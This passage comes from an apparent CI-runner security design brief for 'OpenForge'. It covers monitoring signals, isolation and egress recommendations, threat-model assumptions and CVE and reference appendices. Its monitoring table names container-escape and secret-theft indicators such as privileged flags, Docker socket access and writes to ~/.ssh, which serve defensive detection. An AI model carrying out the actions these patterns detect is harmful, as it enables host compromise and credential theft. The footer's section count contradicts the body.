10. **DNS anomaly detection** (Section 8) — Tenth priority. The internal DNS resolver must monitor query patterns for anomalies. Queries with subdomain labels >64 characters, high Shannon entropy, or unusual record types must be flagged and logged. This is a detection control, not a prevention control — the prevention control is the restricted egress policy (item 3).

**Monitoring choices for OpenForge:**

The monitoring system must be designed to detect the specific failure modes in this document, not to provide generic infrastructure monitoring. Each monitoring control maps to one or more sections:

| What to monitor | Detection signal | Maps to section | Priority |
|---|---|---|---|
| Runner process list before job start | Processes not in expected baseline | 6, 10 | High |
| Runner filesystem hash before job start | Hash mismatch vs. expected image | 6, 10 | High |
| Outbound network connections | Connection to non-allowlisted endpoint | 8 | High |
| DNS query patterns | Subdomain label >64 chars, entropy >4.5 | 8 | High |
| Log output | High-entropy strings, credential patterns, base64 blocks >60 chars | 3 | High |
| Cache write events from untrusted workflows | Write attempt from `pull_request_target` context | 2 | High |
| Action execution | Action SHA does not match registry record | 4 | High |
| Image pull | Digest mismatch, missing signature, typosquatting match | 9 | High |
| New runner registrations | Runner from unexpected IP or with unexpected labels | 6, 10 | Medium |
| Job duration anomalies | Job running >5x expected duration | 6 | Medium |
| Secret access by unusual workflows | Workflow accessing secrets not in its declared scope | 3, 5 | Medium |
| Cache eviction events | Unusual volume of cache writes triggering eviction | 2 | Medium |
| Registry tag changes | Version tag re-pointed to different commit SHA | 4, 9 | Medium |
| Container creation with privileged flags | `--privileged`, `hostPath: /`, `hostPID: true` | 1, 7 | High |
| Docker socket access attempts | Process inside container accessing `/var/run/docker.sock` | 1, 7 | High |
| File writes outside workspace | Write to `/etc`, `/root`, `~/.ssh`, `~/.docker` | 6, 7 | High |

The monitoring system must be deployed before the first untrusted job runs. Monitoring that is added after a compromise has already occurred is forensics, not security.

---

## 13. Summary and Key Recommendations for OpenForge

This document identifies the ten hardest problems in building a trustworthy CI runner, based on real-world incidents and CVEs. The following recommendations synthesize the findings into a coherent design brief for OpenForge.

### Architecture recommendations

1. **MicroVM isolation is non-negotiable.** The runc CVE history (CVE-2019-5736, CVE-2024-21626, CVE-2024-23651/2/3) and the Docker socket mount escape demonstrate that a plain container boundary is not sufficient for untrusted code. OpenForge must use Firecracker, gVisor, or Kata containers as the default isolation mechanism. This is the single highest-impact security decision in the runner design.

2. **Ephemeral runners are the default.** Every job must run on a freshly provisioned runner that is destroyed after the job completes. Persistent runners must be an explicit opt-in with a security review and a documented justification. The runner controller must enforce the invariant that only clean runners (verified via attestation) can be scheduled for untrusted workloads.

3. **The workflow engine must enforce trust separation architecturally.** The `pull_request_target` / fork PR trust boundary is the most common misconfiguration in CI systems. OpenForge's workflow engine must refuse to schedule a job that combines base-repo secrets with fork-origin code. This is not a runtime check — it is a design constraint on the workflow engine.

4. **The cache must be partitioned by trust level.** The cache service must enforce server-side that untrusted workflows cannot write to cache entries that trusted workflows will read. The cache key must include a trust boundary identifier. This is the defense against the TanStack and Cline incidents.

5. **The action registry must be signed and private.** Third-party actions must be signed by a trusted key before they can be executed. The runner must verify the signature at execution time. The registry must be a private mirror so that OpenForge controls which actions are available to users. This is the defense against the tj-actions and Trivy incidents.

6. **Network egress must be restricted at the kernel level.** The default must be "no outbound traffic" with explicit allowlist exceptions. The network policy must be enforced at the kernel level (eBPF, network namespaces, or microVM network policy) rather than at the firewall level. DNS must be restricted to the internal resolver, with anomaly detection on the queries it handles.

7. **The log sanitization pipeline must be independent of the workflow's trust level.** Even a workflow that has full secret access cannot bypass the sanitizer. The sanitizer must detect high-entropy strings, known credential patterns, and base64-encoded blocks. The log store must be access-controlled with short retention for untrusted workflows.

8. **Image pulls must be verified at three independent levels.** (a) Digest match: the image the runner pulls must hash to the digest the workflow declared. (b) Signature verification: the image must carry a valid signature from a trusted key. (c) Registry identity check: the registry hostname and image name must match the expected value exactly, with typosquatting detection.

### What this means for the threat model

The threat model for OpenForge's CI runner must assume:

- The container runtime will have future vulnerabilities. The defense is the microVM boundary, not the container runtime.
- The build log is an exfiltration channel. The defense is log sanitization and access control, not secret masking.
- Third-party actions and images will be compromised. The defense is signature verification and private registry mirroring, not trust.
- Fork PRs will be used as an attack vector. The defense is architectural trust separation in the workflow engine, not documentation.
- The cache will be used for lateral movement. The defense is server-side trust-level partitioning, not client-side key derivation.
- Runners will be reused and contaminated. The defense is ephemeral runners with attestation, not cleanup scripts.
- The host filesystem will be targeted. The defense is no host access, enforced at the microVM boundary.
- Network egress will be used for exfiltration. The defense is kernel-level egress restriction, not firewall rules.
- Images will be substituted. The defense is three-level verification (digest, signature, registry identity).
- The platform will be confused about whether runners are ephemeral. The defense is explicit lifecycle state tracking with attestation.

### Open questions for the design review

1. **gVisor vs. Firecracker vs. Kata:** Which microVM technology does OpenForge use? gVisor has the lowest overhead but the largest attack surface (it is a user-space kernel). Firecracker has the smallest attack surface but the highest overhead. Kata has a middle ground. The choice affects the cold start latency, the performance of I/O-heavy builds, and the set of syscalls available to the job.

2. **Cache trust-level partitioning:** How does the cache service know the trust level of the workflow that is writing to it? The trust level must be passed from the workflow engine to the cache service at write time, and the cache service must enforce it server-side. This requires a protocol change to the cache service API.

3. **Runner attestation:** What does the runner report, and how does the controller verify it? A filesystem hash is strong but expensive (the runner must hash the entire filesystem before each job). A process list is weak (the attacker can hide processes). A TPM-based attestation is strong but requires hardware support. The design must choose a pragmatic balance.

4. **Action signature trust model:** Who signs the actions? The action maintainer? OpenForge? A third-party signing authority? If OpenForge signs actions, OpenForge becomes a central point of trust and a target for attack. If the maintainer signs actions, the signature is only as strong as the maintainer's signing key.

5. **Egress policy granularity:** How fine-grained must the egress allowlist be? A per-job allowlist (each job declares which endpoints it needs) is the most secure but the most complex. A per-workflow allowlist is a reasonable compromise. A per-organization allowlist is the simplest but the least secure.

---

## Appendix: Citation Index by CVE / Advisory ID

| CVE / Advisory | Component | Section |
|---|---|---|
| CVE-2019-5736 | runc | 1, 7 |
| CVE-2022-0492 | cgroups v1 | 7 |
| CVE-2024-21626 | runc (Leaky Vessels) | 1, 7 |
| CVE-2024-23651 | BuildKit (Leaky Vessels) | 1 |
| CVE-2024-23652 | BuildKit (Leaky Vessels) | 1 |
| CVE-2024-23653 | BuildKit (Leaky Vessels) | 1 |
| CVE-2025-30066 | tj-actions/changed-files | 3, 4 |
| CVE-2025-30154 | reviewdog/action-setup | 4 |
| CVE-2026-32946 | Harden-Runner (DNS-over-TCP) | 8 |
| CVE-2026-32947 | Harden-Runner (DoH) | 8 |
| CVE-2026-85747 | Distribution library (manifest) | 9 |
| GHSA-mw4p-6x4p-x5m5 | tj-actions/changed-files | 3, 4 |
| GHSA-xr7r-f8xq-vfvv | runc (Leaky Vessels) | 1 |
| GHSA-xmmx-7jpf-fx42 | Moby (OCI manifest parsing) | 9 |
| GHSL-2024-030 | dotnet/docfx (pwn request) | 5 |
| CERT-EU 2019-003 | runc (CVE-2019-5736) | 1 |
| CERT-EU 2024-016 | runc (CVE-2024-21626) | 1 |

## Appendix: Key Academic References

| Reference | Topic | Section |
|---|---|---|
| Liu et al., USENIX Security 2022 | Container registry typosquatting | 9 |
| Habibi et al., IEEE TNSM 2019 | DNS exfiltration detection | 8 |
| Salat, Davis, Khan, Sensors 2022 | DNS tunneling in cloud environments | 8 |
| Liu et al., Computers & Security 2022 | DoH exfiltration detection | 8 |
| Elaoumari, arXiv 2025 | DoH exfiltration evasion | 8 |

## Appendix: Key Industry References

| Reference | Topic | Section |
|---|---|---|
| GitHub Security Lab "Preventing pwn requests" (2021) | Fork PR trust boundary | 5 |
| GitHub Security Lab GHSL-2024-030 (2024) | docfx pwn request | 5 |
| Wiz "Auditing pull_request_target" (2026) | Script injection in pwn requests | 5 |
| Snyk Labs "Leaky Vessels" (2024) | runc/containerd escape | 1 |
| Kubernetes blog "runc and CVE-2019-5736" (2019) | runc escape | 1 |
| CISA alert (2025) | tj-actions + reviewdog compromise | 3, 4 |
| Unit 42 (2025) | tj-actions threat assessment | 3, 4 |
| GitGuardian (2025) | tj-actions forensic analysis | 3 |
| StepSecurity (2025) | Harden-Runner detection of tj-actions | 3, 4 |
| Adnan Khan (2024) | GitHub Actions cache poisoning | 2 |
| SafeDep (2026) | TanStack cache poisoning incident | 2 |
| Socket.dev (2026) | GitHub cache-mode feature | 2 |
| Mohammad Khan (2026) | Cline supply chain attack | 2 |
| Microsoft MSRC (2023) | Azure CLI credentials in logs | 3 |
| Palo Alto Networks (2023) | Azure CLI leakage patterns | 3 |
| Karim Rahal (2023) | GitHub Actions secret leakage methods | 3 |
| Sysdig (2020) | Tag mutability / TOCTOU | 9 |
| Docker blog (2026) | Trivy supply chain compromise | 4, 9 |
| Docker blog (2026) | Trivy + KICS attack shape | 4, 9 |
| SentinelOne (2026) | CVE-2026-32946/32947 (Harden-Runner) | 8 |
| Eventus Security (2026) | Harden-Runner DNS channel advisories | 8 |
| SentinelOne (2026) | CVE-2026-85747 (Distribution) | 9 |
| Docker Scout (2026) | CVE-2026-85747 technical details | 9 |
| OSV (2024) | Moby OCI manifest parsing | 9 |
| GitLab docs (current) | Self-managed runner security | 6, 10 |
| Safeguard (2026) | Long-lived CI agent hidden state | 6, 10 |
| Barret Blake (2026) | Self-hosted runner persistence problems | 6 |
| runs-on.com (2026) | Ephemeral vs long-lived runners | 6, 10 |
| Tongtech (current) | Shared runner security hygiene | 6, 10 |
| Systems Hardening (2026) | CI/CD runner isolation | 6, 10 |
| EPAR (current) | Ephemeral runner security model | 10 |
| Maxuru (current) | Docker container escape techniques | 1, 7 |
| Yunolay (2025) | Container escape practical guide | 7 |
| Elastic Security (current) | Privileged container detection rule | 7 |
| Safeguard (2026) | Container escape prevention | 7 |
| Docker docs (current) | Bind mount security considerations | 7 |
| Intramweb (2026) | Docker container escape risks | 7 |
| OWASP (current) | Docker Security Cheat Sheet | 7 |
| OWASP (current) | GitHub Actions Security Cheat Sheet | 5 |
| Endor Labs (2024) | PWN request threat explanation | 5 |
| Stéphane Robert (current) | Securing pull_request_target | 5 |
| Cloud Security Alliance (2026) | PRt scan supply chain research | 5 |
| GitHub docs (current) | Compromised runners | 3, 10 |
| GitHub Forensics (2026) | GitHub Actions secrets leak investigation | 3 |
| 100 Days of Red Team (2025) | Exfiltrating secrets via public CI logs | 3 |
| pipebreach.com (2026) | GitHub Actions cache poisoning analysis | 2 |
| neciudan.dev (current) | GitHub Actions poisoning overview | 2 |
| Adnan Khan (2026) | Angular compromise through dev infra | 2 |

---

*End of document. 11 sections. All citations are public URLs. No paywalled sources are used. The USENIX Security 2022 paper (Liu et al.) is freely accessible via the USENIX website. The IEEE TNSM 2019 paper (Habibi et al.) is freely accessible from the UNSW EE department website. The MDPI Sensors 2022 paper (Salat et al.) is open access. The ScienceDirect Computers & Security 2022 paper (Liu et al.) abstract is freely accessible; the full text may be behind a paywall depending on institutional access.*
